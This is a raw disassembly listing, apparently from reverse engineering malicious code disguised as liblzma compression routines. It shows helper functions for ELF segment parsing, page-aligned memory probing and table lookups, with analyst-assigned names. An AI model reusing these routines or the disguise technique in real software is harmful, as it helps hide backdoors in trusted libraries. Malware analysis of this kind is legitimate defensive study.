.text.microlzma_decoda:00000000000021E6                 mov     rdx, r8
.text.microlzma_decoda:00000000000021E9                 add     r15, r8
.text.microlzma_decoda:00000000000021EC                 and     rdx, 0FFFFFFFFFFFFF000h
.text.microlzma_decoda:00000000000021F3                 test    r15d, 0FFFh
.text.microlzma_decoda:00000000000021FA                 jz      short loc_220A
.text.microlzma_decoda:00000000000021FC                 and     r15, 0FFFFFFFFFFFFF000h
.text.microlzma_decoda:0000000000002203                 add     r15, 1000h
.text.microlzma_decoda:000000000000220A
.text.microlzma_decoda:000000000000220A loc_220A:                               ; CODE XREF: maybe_find_freespaces+BA↑j
.text.microlzma_decoda:000000000000220A                 test    r11d, r11d
.text.microlzma_decoda:000000000000220D                 jnz     short loc_2223
.text.microlzma_decoda:000000000000220F                 sub     r15, rdx
.text.microlzma_decoda:0000000000002212                 mov     rbx, rdx
.text.microlzma_decoda:0000000000002215                 mov     eax, r13d
.text.microlzma_decoda:0000000000002218                 mov     r11d, 1
.text.microlzma_decoda:000000000000221E                 mov     r12, r15
.text.microlzma_decoda:0000000000002221                 jmp     short loc_21AC
.text.microlzma_decoda:0000000000002223 ; ---------------------------------------------------------------------------
.text.microlzma_decoda:0000000000002223
.text.microlzma_decoda:0000000000002223 loc_2223:                               ; CODE XREF: maybe_find_freespaces+CD↑j
.text.microlzma_decoda:0000000000002223                 lea     r8, [rbx+r12]
.text.microlzma_decoda:0000000000002227                 cmp     r8, r15
.text.microlzma_decoda:000000000000222A                 jnb     short loc_21AC
.text.microlzma_decoda:000000000000222C                 sub     r15, rdx
.text.microlzma_decoda:000000000000222F                 mov     rbx, rdx
.text.microlzma_decoda:0000000000002232                 mov     eax, r13d
.text.microlzma_decoda:0000000000002235                 mov     r12, r15
.text.microlzma_decoda:0000000000002238                 jmp     loc_21AC
.text.microlzma_decoda:000000000000223D ; ---------------------------------------------------------------------------
.text.microlzma_decoda:000000000000223D
.text.microlzma_decoda:000000000000223D loc_223D:                               ; CODE XREF: maybe_find_freespaces+77↑j
.text.microlzma_decoda:000000000000223D                 test    r11d, r11d
.text.microlzma_decoda:0000000000002240                 jz      short loc_21D4
.text.microlzma_decoda:0000000000002242                 mov     eax, eax
.text.microlzma_decoda:0000000000002244                 mov     rdx, r9
.text.microlzma_decoda:0000000000002247                 sub     rdx, [rcx+8]
.text.microlzma_decoda:000000000000224B                 imul    rax, 38h ; '8'
.text.microlzma_decoda:000000000000224F                 add     rax, [rcx+10h]
.text.microlzma_decoda:0000000000002253                 mov     r8, [rax+28h]
.text.microlzma_decoda:0000000000002257                 add     rdx, [rax+10h]
.text.microlzma_decoda:000000000000225B                 add     r8, rdx
.text.microlzma_decoda:000000000000225E                 add     rdx, [rax+20h]
.text.microlzma_decoda:0000000000002262                 mov     rax, rdx
.text.microlzma_decoda:0000000000002265                 mov     rdx, r8
.text.microlzma_decoda:0000000000002268                 test    r8d, 0FFFh
.text.microlzma_decoda:000000000000226F                 jz      short loc_227F
.text.microlzma_decoda:0000000000002271                 and     rdx, 0FFFFFFFFFFFFF000h
.text.microlzma_decoda:0000000000002278                 add     rdx, 1000h
.text.microlzma_decoda:000000000000227F
.text.microlzma_decoda:000000000000227F loc_227F:                               ; CODE XREF: maybe_find_freespaces+12F↑j
.text.microlzma_decoda:000000000000227F                 mov     r9, rdx
.text.microlzma_decoda:0000000000002282                 sub     rdx, r8
.text.microlzma_decoda:0000000000002285                 mov     [rcx+0B8h], rax
.text.microlzma_decoda:000000000000228C                 sub     r9, rax
.text.microlzma_decoda:000000000000228F                 mov     [rcx+0C8h], rdx
.text.microlzma_decoda:0000000000002296                 mov     [rcx+0C0h], r9
.text.microlzma_decoda:000000000000229D                 test    edi, edi
.text.microlzma_decoda:000000000000229F                 jnz     short loc_22A6
.text.microlzma_decoda:00000000000022A1                 mov     [rsi], r9
.text.microlzma_decoda:00000000000022A4                 jmp     short loc_22B5
.text.microlzma_decoda:00000000000022A6 ; ---------------------------------------------------------------------------
.text.microlzma_decoda:00000000000022A6
.text.microlzma_decoda:00000000000022A6 loc_22A6:                               ; CODE XREF: maybe_find_freespaces+15F↑j
.text.microlzma_decoda:00000000000022A6                 mov     [rsi], rdx
.text.microlzma_decoda:00000000000022A9                 test    rdx, rdx
.text.microlzma_decoda:00000000000022AC                 jz      loc_21D4
.text.microlzma_decoda:00000000000022B2                 mov     rax, r8
.text.microlzma_decoda:00000000000022B5
.text.microlzma_decoda:00000000000022B5 loc_22B5:                               ; CODE XREF: maybe_find_freespaces+96↑j
.text.microlzma_decoda:00000000000022B5                                         ; maybe_find_freespaces+164↑j
.text.microlzma_decoda:00000000000022B5                 pop     rbx
.text.microlzma_decoda:00000000000022B6                 pop     r12
.text.microlzma_decoda:00000000000022B8                 pop     r13
.text.microlzma_decoda:00000000000022BA                 pop     r14
.text.microlzma_decoda:00000000000022BC                 pop     r15
.text.microlzma_decoda:00000000000022BE                 retn
.text.microlzma_decoda:00000000000022BF ; ---------------------------------------------------------------------------
.text.microlzma_decoda:00000000000022BF
.text.microlzma_decoda:00000000000022BF locret_22BF:                            ; CODE XREF: maybe_find_freespaces+52↑j
.text.microlzma_decoda:00000000000022BF                                         ; maybe_find_freespaces+5A↑j
.text.microlzma_decoda:00000000000022BF                 retn
.text.microlzma_decoda:00000000000022BF maybe_find_freespaces endp
.text.microlzma_decoda:00000000000022BF
.text.microlzma_decoda:00000000000022BF _text_microlzma_decoda ends
.text.microlzma_decoda:00000000000022BF
.text.auto_decoda:00000000000022C0 ; ===========================================================================
.text.auto_decoda:00000000000022C0
.text.auto_decoda:00000000000022C0 ; Segment type: Pure code
.text.auto_decoda:00000000000022C0 ; Segment permissions: Read/Execute
.text.auto_decoda:00000000000022C0 _text_auto_decoda segment para public 'CODE' use64
.text.auto_decoda:00000000000022C0                 assume cs:_text_auto_decoda
.text.auto_decoda:00000000000022C0                 ;org 22C0h
.text.auto_decoda:00000000000022C0                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.auto_decoda:00000000000022C0
.text.auto_decoda:00000000000022C0 ; =============== S U B R O U T I N E =======================================
.text.auto_decoda:00000000000022C0
.text.auto_decoda:00000000000022C0
.text.auto_decoda:00000000000022C0 ; __int64 __fastcall Lauto_decode_1(struct_elf_info *, unsigned __int64, unsigned __int64, int)
.text.auto_decoda:00000000000022C0 _Lauto_decode_1 proc near               ; CODE XREF: sub_2A40+61↓p
.text.auto_decoda:00000000000022C0                                         ; parse_elf_init+B26↓p
.text.auto_decoda:00000000000022C0                 endbr64
.text.auto_decoda:00000000000022C4                 push    r14
.text.auto_decoda:00000000000022C6                 mov     r14d, ecx
.text.auto_decoda:00000000000022C9                 mov     ecx, 2
.text.auto_decoda:00000000000022CE                 push    r13
.text.auto_decoda:00000000000022D0                 mov     r13, rdi
.text.auto_decoda:00000000000022D3                 push    r12
.text.auto_decoda:00000000000022D5                 mov     r12, rdx
.text.auto_decoda:00000000000022D8                 push    rbx
.text.auto_decoda:00000000000022D9                 mov     rbx, rsi
.text.auto_decoda:00000000000022DC                 push    r8
.text.auto_decoda:00000000000022DE                 call    process_elf_seg ; PIC mode
.text.auto_decoda:00000000000022E3                 test    eax, eax
.text.auto_decoda:00000000000022E5                 jz      short loc_2354
.text.auto_decoda:00000000000022E7                 mov     eax, 1
.text.auto_decoda:00000000000022EC                 test    r14d, r14d
.text.auto_decoda:00000000000022EF                 jz      short loc_2354
.text.auto_decoda:00000000000022F1                 cmp     dword ptr [r13+4Ch], 0
.text.auto_decoda:00000000000022F6                 jz      short loc_2354
.text.auto_decoda:00000000000022F8                 mov     rcx, [r13+58h]
.text.auto_decoda:00000000000022FC                 mov     rdx, [r13+0]
.text.auto_decoda:0000000000002300                 sub     rdx, [r13+8]
.text.auto_decoda:0000000000002304                 add     rdx, [r13+50h]
.text.auto_decoda:0000000000002308                 add     rcx, rdx
.text.auto_decoda:000000000000230B                 and     rdx, 0FFFFFFFFFFFFF000h
.text.auto_decoda:0000000000002312                 test    ecx, 0FFFh
.text.auto_decoda:0000000000002318                 jz      short loc_2328
.text.auto_decoda:000000000000231A                 and     rcx, 0FFFFFFFFFFFFF000h
.text.auto_decoda:0000000000002321                 add     rcx, 1000h
.text.auto_decoda:0000000000002328
.text.auto_decoda:0000000000002328 loc_2328:                               ; CODE XREF: _Lauto_decode_1+58↑j
.text.auto_decoda:0000000000002328                 cmp     rbx, rdx
.text.auto_decoda:000000000000232B                 setnb   sil
.text.auto_decoda:000000000000232F                 cmp     rbx, rcx
.text.auto_decoda:0000000000002332                 jnb     short loc_233B
.text.auto_decoda:0000000000002334                 xor     eax, eax
.text.auto_decoda:0000000000002336                 test    sil, sil
.text.auto_decoda:0000000000002339                 jnz     short loc_2354
.text.auto_decoda:000000000000233B
.text.auto_decoda:000000000000233B loc_233B:                               ; CODE XREF: _Lauto_decode_1+72↑j
.text.auto_decoda:000000000000233B                 add     rbx, r12
.text.auto_decoda:000000000000233E                 cmp     rdx, rbx
.text.auto_decoda:0000000000002341                 setb    al
.text.auto_decoda:0000000000002344                 or      eax, esi
.text.auto_decoda:0000000000002346                 cmp     rcx, rbx
.text.auto_decoda:0000000000002349                 setnb   dl
.text.auto_decoda:000000000000234C                 and     eax, edx
.text.auto_decoda:000000000000234E                 xor     eax, 1
.text.auto_decoda:0000000000002351                 movzx   eax, al
.text.auto_decoda:0000000000002354
.text.auto_decoda:0000000000002354 loc_2354:                               ; CODE XREF: _Lauto_decode_1+25↑j
.text.auto_decoda:0000000000002354                                         ; _Lauto_decode_1+2F↑j ...
.text.auto_decoda:0000000000002354                 pop     rdx
.text.auto_decoda:0000000000002355                 pop     rbx
.text.auto_decoda:0000000000002356                 pop     r12
.text.auto_decoda:0000000000002358                 pop     r13
.text.auto_decoda:000000000000235A                 pop     r14
.text.auto_decoda:000000000000235C                 retn
.text.auto_decoda:000000000000235C _Lauto_decode_1 endp
.text.auto_decoda:000000000000235C
.text.auto_decoda:000000000000235C _text_auto_decoda ends
.text.auto_decoda:000000000000235C
.text.hc_find_funa:0000000000002360 ; ===========================================================================
.text.hc_find_funa:0000000000002360
.text.hc_find_funa:0000000000002360 ; Segment type: Pure code
.text.hc_find_funa:0000000000002360 ; Segment permissions: Read/Execute
.text.hc_find_funa:0000000000002360 _text_hc_find_funa segment para public 'CODE' use64
.text.hc_find_funa:0000000000002360                 assume cs:_text_hc_find_funa
.text.hc_find_funa:0000000000002360                 ;org 2360h
.text.hc_find_funa:0000000000002360                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.hc_find_funa:0000000000002360
.text.hc_find_funa:0000000000002360 ; =============== S U B R O U T I N E =======================================
.text.hc_find_funa:0000000000002360
.text.hc_find_funa:0000000000002360
.text.hc_find_funa:0000000000002360 ; __int64 __fastcall Lhc_find_func_1(unsigned __int64, __int64, __int64)
.text.hc_find_funa:0000000000002360 _Lhc_find_func_1 proc near              ; CODE XREF: _Lstream_decoder_mt_get_progress_0+72↓p
.text.hc_find_funa:0000000000002360                                         ; _Lstream_decoder_mt_get_progress_0+AA↓p ...
.text.hc_find_funa:0000000000002360
.text.hc_find_funa:0000000000002360 var_38          = qword ptr -38h
.text.hc_find_funa:0000000000002360 var_30          = qword ptr -30h
.text.hc_find_funa:0000000000002360
.text.hc_find_funa:0000000000002360                 endbr64
.text.hc_find_funa:0000000000002364                 test    rsi, rsi
.text.hc_find_funa:0000000000002367                 jz      loc_2421
.text.hc_find_funa:000000000000236D                 push    r13
.text.hc_find_funa:000000000000236F                 push    r12
.text.hc_find_funa:0000000000002371                 push    rbp
.text.hc_find_funa:0000000000002372                 push    rbx
.text.hc_find_funa:0000000000002373                 mov     rbx, rdi
.text.hc_find_funa:0000000000002376                 sub     rsp, 18h
.text.hc_find_funa:000000000000237A                 cmp     rdi, 0FFFFFFh
.text.hc_find_funa:0000000000002381                 ja      short loc_238A
.text.hc_find_funa:0000000000002383
.text.hc_find_funa:0000000000002383 loc_2383:                               ; CODE XREF: _Lhc_find_func_1+46↓j
.text.hc_find_funa:0000000000002383                                         ; _Lhc_find_func_1+53↓j ...
.text.hc_find_funa:0000000000002383                 xor     eax, eax
.text.hc_find_funa:0000000000002385                 jmp     loc_2416
.text.hc_find_funa:000000000000238A ; ---------------------------------------------------------------------------
.text.hc_find_funa:000000000000238A
.text.hc_find_funa:000000000000238A loc_238A:                               ; CODE XREF: _Lhc_find_func_1+21↑j
.text.hc_find_funa:000000000000238A                 lea     rbp, [rdi+rsi]
.text.hc_find_funa:000000000000238E                 and     rbx, 0FFFFFFFFFFFFF000h
.text.hc_find_funa:0000000000002395                 cmp     rbx, rbp
.text.hc_find_funa:0000000000002398                 jnb     short loc_2411
.text.hc_find_funa:000000000000239A                 xor     ecx, ecx
.text.hc_find_funa:000000000000239C                 mov     r12, rdx
.text.hc_find_funa:000000000000239F                 mov     [rsp+38h+var_38], rcx
.text.hc_find_funa:00000000000023A3                 test    rdx, rdx
.text.hc_find_funa:00000000000023A6                 jz      short loc_2383
.text.hc_find_funa:00000000000023A8                 mov     r13, rsp
.text.hc_find_funa:00000000000023AB
.text.hc_find_funa:00000000000023AB loc_23AB:                               ; CODE XREF: _Lhc_find_func_1+AF↓j
.text.hc_find_funa:00000000000023AB                 mov     rax, [r12+10h]
.text.hc_find_funa:00000000000023B0                 test    rax, rax
.text.hc_find_funa:00000000000023B3                 jz      short loc_2383
.text.hc_find_funa:00000000000023B5                 cmp     qword ptr [rax+50h], 0
.text.hc_find_funa:00000000000023BA                 jz      short loc_2383
.text.hc_find_funa:00000000000023BC                 mov     rax, [rax+40h]
.text.hc_find_funa:00000000000023C0                 test    rax, rax
.text.hc_find_funa:00000000000023C3                 jz      short loc_2383
.text.hc_find_funa:00000000000023C5                 xor     ecx, ecx
.text.hc_find_funa:00000000000023C7                 xor     edx, edx
.text.hc_find_funa:00000000000023C9                 xor     esi, esi
.text.hc_find_funa:00000000000023CB                 mov     r9, rbx
.text.hc_find_funa:00000000000023CE                 mov     [rsp+38h+var_30], 1
.text.hc_find_funa:00000000000023D7                 mov     r8, r13
.text.hc_find_funa:00000000000023DA                 mov     edi, 1
.text.hc_find_funa:00000000000023DF                 call    rax
.text.hc_find_funa:00000000000023E1                 test    eax, eax
.text.hc_find_funa:00000000000023E3                 jns     short loc_23FD
.text.hc_find_funa:00000000000023E5                 mov     rax, [r12+10h]
.text.hc_find_funa:00000000000023EA                 call    qword ptr [rax+50h]
.text.hc_find_funa:00000000000023ED                 cmp     dword ptr [rax], 0Eh
.text.hc_find_funa:00000000000023F0                 jz      short loc_23F7
.text.hc_find_funa:00000000000023F2                 test    rbx, rbx
.text.hc_find_funa:00000000000023F5                 jnz     short loc_23FD
.text.hc_find_funa:00000000000023F7
.text.hc_find_funa:00000000000023F7 loc_23F7:                               ; CODE XREF: _Lhc_find_func_1+90↑j
.text.hc_find_funa:00000000000023F7                 xor     edx, edx
.text.hc_find_funa:00000000000023F9                 mov     [rax], edx
.text.hc_find_funa:00000000000023FB                 jmp     short loc_2383
.text.hc_find_funa:00000000000023FD ; ---------------------------------------------------------------------------
.text.hc_find_funa:00000000000023FD
.text.hc_find_funa:00000000000023FD loc_23FD:                               ; CODE XREF: _Lhc_find_func_1+83↑j
.text.hc_find_funa:00000000000023FD                                         ; _Lhc_find_func_1+95↑j
.text.hc_find_funa:00000000000023FD                 add     rbx, 1000h
.text.hc_find_funa:0000000000002404                 cmp     rbx, rbp
.text.hc_find_funa:0000000000002407                 jnb     short loc_2411
.text.hc_find_funa:0000000000002409                 xor     eax, eax
.text.hc_find_funa:000000000000240B                 mov     [rsp+38h+var_38], rax
.text.hc_find_funa:000000000000240F                 jmp     short loc_23AB
.text.hc_find_funa:0000000000002411 ; ---------------------------------------------------------------------------
.text.hc_find_funa:0000000000002411
.text.hc_find_funa:0000000000002411 loc_2411:                               ; CODE XREF: _Lhc_find_func_1+38↑j
.text.hc_find_funa:0000000000002411                                         ; _Lhc_find_func_1+A7↑j
.text.hc_find_funa:0000000000002411                 mov     eax, 1
.text.hc_find_funa:0000000000002416
.text.hc_find_funa:0000000000002416 loc_2416:                               ; CODE XREF: _Lhc_find_func_1+25↑j
.text.hc_find_funa:0000000000002416                 add     rsp, 18h
.text.hc_find_funa:000000000000241A                 pop     rbx
.text.hc_find_funa:000000000000241B                 pop     rbp
.text.hc_find_funa:000000000000241C                 pop     r12
.text.hc_find_funa:000000000000241E                 pop     r13
.text.hc_find_funa:0000000000002420                 retn
.text.hc_find_funa:0000000000002421 ; ---------------------------------------------------------------------------
.text.hc_find_funa:0000000000002421
.text.hc_find_funa:0000000000002421 loc_2421:                               ; CODE XREF: _Lhc_find_func_1+7↑j
.text.hc_find_funa:0000000000002421                 xor     eax, eax
.text.hc_find_funa:0000000000002423                 retn
.text.hc_find_funa:0000000000002423 _Lhc_find_func_1 endp
.text.hc_find_funa:0000000000002423
.text.hc_find_funa:0000000000002423 _text_hc_find_funa ends
.text.hc_find_funa:0000000000002423
.text.lzma_simple_props_encoda:0000000000002430 ; ===========================================================================
.text.lzma_simple_props_encoda:0000000000002430
.text.lzma_simple_props_encoda:0000000000002430 ; Segment type: Pure code
.text.lzma_simple_props_encoda:0000000000002430 ; Segment permissions: Read/Execute
.text.lzma_simple_props_encoda:0000000000002430 _text_lzma_simple_props_encoda segment para public 'CODE' use64
.text.lzma_simple_props_encoda:0000000000002430                 assume cs:_text_lzma_simple_props_encoda
.text.lzma_simple_props_encoda:0000000000002430                 ;org 2430h
.text.lzma_simple_props_encoda:0000000000002430                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.lzma_simple_props_encoda:0000000000002430
.text.lzma_simple_props_encoda:0000000000002430 ; =============== S U B R O U T I N E =======================================
.text.lzma_simple_props_encoda:0000000000002430
.text.lzma_simple_props_encoda:0000000000002430 ; Attributes: bp-based frame
.text.lzma_simple_props_encoda:0000000000002430
.text.lzma_simple_props_encoda:0000000000002430 ; __int64 __fastcall j_tls_get_addr(__int64)
.text.lzma_simple_props_encoda:0000000000002430                 public j_tls_get_addr
.text.lzma_simple_props_encoda:0000000000002430 j_tls_get_addr  proc near               ; CODE XREF: .text.lzma_simple_x86_encoder_inia:0000000000002473↓p
.text.lzma_simple_props_encoda:0000000000002430
.text.lzma_simple_props_encoda:0000000000002430 var_8           = qword ptr -8
.text.lzma_simple_props_encoda:0000000000002430
.text.lzma_simple_props_encoda:0000000000002430                 endbr64
.text.lzma_simple_props_encoda:0000000000002434                 push    rbp
.text.lzma_simple_props_encoda:0000000000002435                 mov     rbp, rsp
.text.lzma_simple_props_encoda:0000000000002438                 sub     rsp, 10h
.text.lzma_simple_props_encoda:000000000000243C                 mov     [rbp+var_8], rdi
.text.lzma_simple_props_encoda:0000000000002440                 mov     rax, [rbp+var_8]
.text.lzma_simple_props_encoda:0000000000002444                 mov     rdi, rax
.text.lzma_simple_props_encoda:0000000000002447                 call    __tls_get_addr  ; PIC mode
.text.lzma_simple_props_encoda:000000000000244C                 leave
.text.lzma_simple_props_encoda:000000000000244D                 retn
.text.lzma_simple_props_encoda:000000000000244D j_tls_get_addr  endp
.text.lzma_simple_props_encoda:000000000000244D
.text.lzma_simple_props_encoda:000000000000244D _text_lzma_simple_props_encoda ends
.text.lzma_simple_props_encoda:000000000000244D
.text.lzma_simple_x86_encoder_inia:0000000000002450 ; ---------------------------------------------------------------------------
.text.lzma_simple_x86_encoder_inia:0000000000002450 ; ===========================================================================
.text.lzma_simple_x86_encoder_inia:0000000000002450
.text.lzma_simple_x86_encoder_inia:0000000000002450 ; Segment type: Pure code
.text.lzma_simple_x86_encoder_inia:0000000000002450 ; Segment permissions: Read/Execute
.text.lzma_simple_x86_encoder_inia:0000000000002450 _text_lzma_simple_x86_encoder_inia segment para public 'CODE' use64
.text.lzma_simple_x86_encoder_inia:0000000000002450                 assume cs:_text_lzma_simple_x86_encoder_inia
.text.lzma_simple_x86_encoder_inia:0000000000002450                 ;org 2450h
.text.lzma_simple_x86_encoder_inia:0000000000002450                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.lzma_simple_x86_encoder_inia:0000000000002450                 endbr64
.text.lzma_simple_x86_encoder_inia:0000000000002454                 push    rbp
.text.lzma_simple_x86_encoder_inia:0000000000002455                 mov     rbp, rsp
.text.lzma_simple_x86_encoder_inia:0000000000002458                 sub     rsp, 10h
.text.lzma_simple_x86_encoder_inia:000000000000245C                 mov     qword ptr [rbp-10h], 0
.text.lzma_simple_x86_encoder_inia:0000000000002464                 mov     qword ptr [rbp-8], 0
.text.lzma_simple_x86_encoder_inia:000000000000246C                 lea     rax, [rbp-10h]
.text.lzma_simple_x86_encoder_inia:0000000000002470                 mov     rdi, rax
.text.lzma_simple_x86_encoder_inia:0000000000002473                 call    j_tls_get_addr  ; PIC mode
.text.lzma_simple_x86_encoder_inia:0000000000002478                 nop
.text.lzma_simple_x86_encoder_inia:0000000000002479                 leave
.text.lzma_simple_x86_encoder_inia:000000000000247A                 retn
.text.lzma_simple_x86_encoder_inia:000000000000247A _text_lzma_simple_x86_encoder_inia ends
.text.lzma_simple_x86_encoder_inia:000000000000247A
.text.stream_decoder_mt_ena:0000000000002480 ; ===========================================================================
.text.stream_decoder_mt_ena:0000000000002480
.text.stream_decoder_mt_ena:0000000000002480 ; Segment type: Pure code
.text.stream_decoder_mt_ena:0000000000002480 ; Segment permissions: Read/Execute
.text.stream_decoder_mt_ena:0000000000002480 _text_stream_decoder_mt_ena segment para public 'CODE' use64
.text.stream_decoder_mt_ena:0000000000002480                 assume cs:_text_stream_decoder_mt_ena
.text.stream_decoder_mt_ena:0000000000002480                 ;org 2480h
.text.stream_decoder_mt_ena:0000000000002480                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.stream_decoder_mt_ena:0000000000002480
.text.stream_decoder_mt_ena:0000000000002480 ; =============== S U B R O U T I N E =======================================
.text.stream_decoder_mt_ena:0000000000002480
.text.stream_decoder_mt_ena:0000000000002480 ; Attributes: bp-based frame
.text.stream_decoder_mt_ena:0000000000002480
.text.stream_decoder_mt_ena:0000000000002480 ; char *get_lzma_allocator_addr()
.text.stream_decoder_mt_ena:0000000000002480                 public get_lzma_allocator_addr
.text.stream_decoder_mt_ena:0000000000002480 get_lzma_allocator_addr proc near       ; CODE XREF: get_lzma_allocator+9↓p
.text.stream_decoder_mt_ena:0000000000002480
.text.stream_decoder_mt_ena:0000000000002480 var_28          = qword ptr -28h
.text.stream_decoder_mt_ena:0000000000002480 var_18          = qword ptr -18h
.text.stream_decoder_mt_ena:0000000000002480 var_C           = dword ptr -0Ch
.text.stream_decoder_mt_ena:0000000000002480 var_8           = qword ptr -8
.text.stream_decoder_mt_ena:0000000000002480
.text.stream_decoder_mt_ena:0000000000002480                 endbr64
.text.stream_decoder_mt_ena:0000000000002484                 push    rbp
.text.stream_decoder_mt_ena:0000000000002485                 mov     rbp, rsp
.text.stream_decoder_mt_ena:0000000000002488                 mov     [rbp+var_28], rdi
.text.stream_decoder_mt_ena:000000000000248C                 mov     [rbp+var_18], 0
.text.stream_decoder_mt_ena:0000000000002494                 mov     rax, cs:_Llookup_filter_part_0
.text.stream_decoder_mt_ena:000000000000249B                 mov     [rbp+var_8], rax
.text.stream_decoder_mt_ena:000000000000249F                 mov     [rbp+var_C], 0
.text.stream_decoder_mt_ena:00000000000024A6                 jmp     short loc_24C6
.text.stream_decoder_mt_ena:00000000000024A8 ; ---------------------------------------------------------------------------
.text.stream_decoder_mt_ena:00000000000024A8
.text.stream_decoder_mt_ena:00000000000024A8 loc_24A8:                               ; CODE XREF: get_lzma_allocator_addr+4A↓j
.text.stream_decoder_mt_ena:00000000000024A8                 mov     rax, [rbp+var_8]
.text.stream_decoder_mt_ena:00000000000024AC                 mov     rax, [rax]
.text.stream_decoder_mt_ena:00000000000024AF                 cmp     [rbp+var_28], rax
.text.stream_decoder_mt_ena:00000000000024B3                 jnz     short loc_24BD
.text.stream_decoder_mt_ena:00000000000024B5                 mov     rax, [rbp+var_8]
.text.stream_decoder_mt_ena:00000000000024B9                 mov     [rbp+var_18], rax
.text.stream_decoder_mt_ena:00000000000024BD
.text.stream_decoder_mt_ena:00000000000024BD loc_24BD:                               ; CODE XREF: get_lzma_allocator_addr+33↑j
.text.stream_decoder_mt_ena:00000000000024BD                 add     [rbp+var_C], 1
.text.stream_decoder_mt_ena:00000000000024C1                 add     [rbp+var_8], 20h ; ' '
.text.stream_decoder_mt_ena:00000000000024C6
.text.stream_decoder_mt_ena:00000000000024C6 loc_24C6:                               ; CODE XREF: get_lzma_allocator_addr+26↑j
.text.stream_decoder_mt_ena:00000000000024C6                 cmp     [rbp+var_C], 0Bh
.text.stream_decoder_mt_ena:00000000000024CA                 jbe     short loc_24A8
.text.stream_decoder_mt_ena:00000000000024CC                 mov     rax, [rbp+var_8]
.text.stream_decoder_mt_ena:00000000000024D0                 pop     rbp
.text.stream_decoder_mt_ena:00000000000024D1                 retn
.text.stream_decoder_mt_ena:00000000000024D1 get_lzma_allocator_addr endp
.text.stream_decoder_mt_ena:00000000000024D1
.text.stream_decoder_mt_ena:00000000000024D1 _text_stream_decoder_mt_ena ends
.text.stream_decoder_mt_ena:00000000000024D1
.text.lzma_lz_encoder_memusaga:00000000000024E0 ; ===========================================================================
.text.lzma_lz_encoder_memusaga:00000000000024E0
.text.lzma_lz_encoder_memusaga:00000000000024E0 ; Segment type: Pure code
.text.lzma_lz_encoder_memusaga:00000000000024E0 ; Segment permissions: Read/Execute
.text.lzma_lz_encoder_memusaga:00000000000024E0 _text_lzma_lz_encoder_memusaga segment para public 'CODE' use64
.text.lzma_lz_encoder_memusaga:00000000000024E0                 assume cs:_text_lzma_lz_encoder_memusaga
.text.lzma_lz_encoder_memusaga:00000000000024E0                 ;org 24E0h
.text.lzma_lz_encoder_memusaga:00000000000024E0                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.lzma_lz_encoder_memusaga:00000000000024E0
.text.lzma_lz_encoder_memusaga:00000000000024E0 ; =============== S U B R O U T I N E =======================================
.text.lzma_lz_encoder_memusaga:00000000000024E0
.text.lzma_lz_encoder_memusaga:00000000000024E0 ; Attributes: bp-based frame
.text.lzma_lz_encoder_memusaga:00000000000024E0
.text.lzma_lz_encoder_memusaga:00000000000024E0 ; struc_Lencoder *__fastcall get__Lencoder_1_addr()
.text.lzma_lz_encoder_memusaga:00000000000024E0                 public get__Lencoder_1_addr
.text.lzma_lz_encoder_memusaga:00000000000024E0 get__Lencoder_1_addr proc near          ; CODE XREF: parse_elf_init+5EA↓p
.text.lzma_lz_encoder_memusaga:00000000000024E0
.text.lzma_lz_encoder_memusaga:00000000000024E0 var_28          = qword ptr -28h
.text.lzma_lz_encoder_memusaga:00000000000024E0 var_18          = qword ptr -18h
.text.lzma_lz_encoder_memusaga:00000000000024E0 var_C           = dword ptr -0Ch
.text.lzma_lz_encoder_memusaga:00000000000024E0 var_8           = qword ptr -8
.text.lzma_lz_encoder_memusaga:00000000000024E0
.text.lzma_lz_encoder_memusaga:00000000000024E0                 endbr64
.text.lzma_lz_encoder_memusaga:00000000000024E4                 push    rbp
.text.lzma_lz_encoder_memusaga:00000000000024E5                 mov     rbp, rsp
.text.lzma_lz_encoder_memusaga:00000000000024E8                 mov     [rbp+var_28], rdi
.text.lzma_lz_encoder_memusaga:00000000000024EC                 mov     [rbp+var_18], 0
.text.lzma_lz_encoder_memusaga:00000000000024F4                 mov     rax, cs:_Lfilter_optmap_0
.text.lzma_lz_encoder_memusaga:00000000000024FB                 mov     [rbp+var_8], rax
.text.lzma_lz_encoder_memusaga:00000000000024FF                 mov     [rbp+var_C], 0
.text.lzma_lz_encoder_memusaga:0000000000002506                 jmp     short loc_2526
.text.lzma_lz_encoder_memusaga:0000000000002508 ; ---------------------------------------------------------------------------
.text.lzma_lz_encoder_memusaga:0000000000002508
.text.lzma_lz_encoder_memusaga:0000000000002508 loc_2508:                               ; CODE XREF: get__Lencoder_1_addr+4A↓j
.text.lzma_lz_encoder_memusaga:0000000000002508                 mov     rax, [rbp+var_8]
.text.lzma_lz_encoder_memusaga:000000000000250C                 mov     rax, [rax]
.text.lzma_lz_encoder_memusaga:000000000000250F                 cmp     [rbp+var_28], rax
.text.lzma_lz_encoder_memusaga:0000000000002513                 jnz     short loc_251D
.text.lzma_lz_encoder_memusaga:0000000000002515                 mov     rax, [rbp+var_8]
.text.lzma_lz_encoder_memusaga:0000000000002519                 mov     [rbp+var_18], rax
.text.lzma_lz_encoder_memusaga:000000000000251D
.text.lzma_lz_encoder_memusaga:000000000000251D loc_251D:                               ; CODE XREF: get__Lencoder_1_addr+33↑j
.text.lzma_lz_encoder_memusaga:000000000000251D                 add     [rbp+var_C], 1
.text.lzma_lz_encoder_memusaga:0000000000002521                 add     [rbp+var_8], 38h ; '8'
.text.lzma_lz_encoder_memusaga:0000000000002526
.text.lzma_lz_encoder_memusaga:0000000000002526 loc_2526:                               ; CODE XREF: get__Lencoder_1_addr+26↑j
.text.lzma_lz_encoder_memusaga:0000000000002526                 cmp     [rbp+var_C], 0Bh
.text.lzma_lz_encoder_memusaga:000000000000252A                 jbe     short loc_2508
.text.lzma_lz_encoder_memusaga:000000000000252C                 mov     rax, [rbp+var_8]
.text.lzma_lz_encoder_memusaga:0000000000002530                 pop     rbp
.text.lzma_lz_encoder_memusaga:0000000000002531                 retn
.text.lzma_lz_encoder_memusaga:0000000000002531 get__Lencoder_1_addr endp
.text.lzma_lz_encoder_memusaga:0000000000002531
.text.lzma_lz_encoder_memusaga:0000000000002531 ; ---------------------------------------------------------------------------
.text.lzma_lz_encoder_memusaga:0000000000002532                 align 20h
